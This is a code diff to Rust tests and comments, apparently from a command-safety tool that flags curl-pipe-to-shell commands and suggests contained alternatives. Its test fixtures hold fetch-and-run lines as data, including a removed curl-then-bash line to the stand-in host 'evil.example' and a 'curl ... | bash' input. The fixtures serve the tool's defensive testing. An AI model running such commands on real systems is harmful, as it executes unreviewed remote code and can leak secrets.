@@ -62,10 +62,10 @@ pub struct JsonOutput<'a> {
 
 /// Return a redacted clone of a [`SafeSuggestion`] for JSON output.
 ///
-/// `safe_command` re-embeds the user's original command/URL/path (the
-/// pipe-to-shell, sudo-narrow, env-scrub, archive, and dotfile rewrites all
-/// splice attacker- or user-controlled input back in), and `rationale` is a
-/// per-rule string that some transforms (env-scrub) build with a runtime value.
+/// `safe_command` re-embeds the user's original command/URL/path. Executable
+/// suggestions are limited to the verified fail-closed pipe runner, which
+/// splices attacker- or user-controlled input back in. Guidance-only rationale
+/// can also include runtime-derived context.
 /// Rationale is scrubbed with the SAME `custom_patterns` the caller uses for
 /// findings. An executable command cannot be scrubbed in place: redaction would
 /// produce a different string that was never analyzed. When it would change,
@@ -756,13 +756,13 @@ mod tests {
         let custom = vec![secret.to_string()];
         let sugg = vec![SafeSuggestion {
             rule_id: "curl_pipe_shell".to_string(),
-            // Mirrors what `rewrite_pipe_to_shell` emits: the original URL spliced
-            // back into the rewrite. Here the URL carries the custom-pattern token.
+            // Mirrors what `rewrite_pipe_to_shell` emits: the original URL is the
+            // runner's quoted argument and Tirith is absolute. Here the URL
+            // carries the custom-pattern token.
             safe_command: Some(format!(
-                "curl -fsSL -o /tmp/tirith-review.sh 'https://evil.example/{secret}' && \
-                 less /tmp/tirith-review.sh && bash /tmp/tirith-review.sh"
+                "'/usr/local/bin/tirith' run --capsule --script-stdin --interpreter bash 'https://evil.example/{secret}'"
             )),
-            // Also plant it in the rationale (env-scrub builds this at runtime).
+            // Also plant it in the rationale to cover runtime-derived guidance.
             rationale: format!("downloads {secret} for review"),
             remediation: "review before running".to_string(),
         }];
@@ -1298,32 +1298,27 @@ mod tests {
 
     #[test]
     fn write_safe_suggestions_renders_try_and_fix() {
-        let verdict = Verdict::from_findings(
-            vec![Finding {
-                rule_id: RuleId::CurlPipeShell,
-                severity: Severity::High,
-                title: "t".into(),
-                description: "d".into(),
-                evidence: vec![Evidence::Text { detail: "e".into() }],
-                human_view: None,
-                agent_view: None,
-                mitre_id: None,
-                custom_rule_id: None,
-            }],
-            3,
-            Timings::default(),
-        );
-        let sugg = crate::safe_command::suggest(
-            "curl https://example.com/x.sh | bash",
-            crate::tokenize::ShellType::Posix,
-            &verdict,
-        );
+        // Rendering is tested with a deliberately constructed, already-verified
+        // suggestion. Public generation is provenance-sensitive and correctly
+        // remains guidance-only for Cargo's replaceable test binary.
+        let sugg = vec![SafeSuggestion {
+            rule_id: "curl_pipe_shell".to_string(),
+            safe_command: Some(
+                "'/usr/local/bin/tirith' run --capsule --script-stdin --interpreter bash 'https://example.com/x.sh'"
+                    .to_string(),
+            ),
+            rationale: "verified contained runner".to_string(),
+            remediation: "review before running".to_string(),
+        }];
         let mut buf = Vec::new();
         write_safe_suggestions(&sugg, &mut buf).unwrap();
         let out = String::from_utf8(buf).unwrap();
         assert!(out.contains("safer alternative"), "{out}");
         assert!(out.contains("try:"), "{out}");
-        assert!(out.contains("/tmp/tirith-review.sh"), "{out}");
+        assert!(
+            out.contains("'/usr/local/bin/tirith' run --capsule --script-stdin --interpreter bash 'https://example.com/x.sh'"),
+            "{out}"
+        );
         assert!(out.contains("fix:"), "{out}");
     }
 }
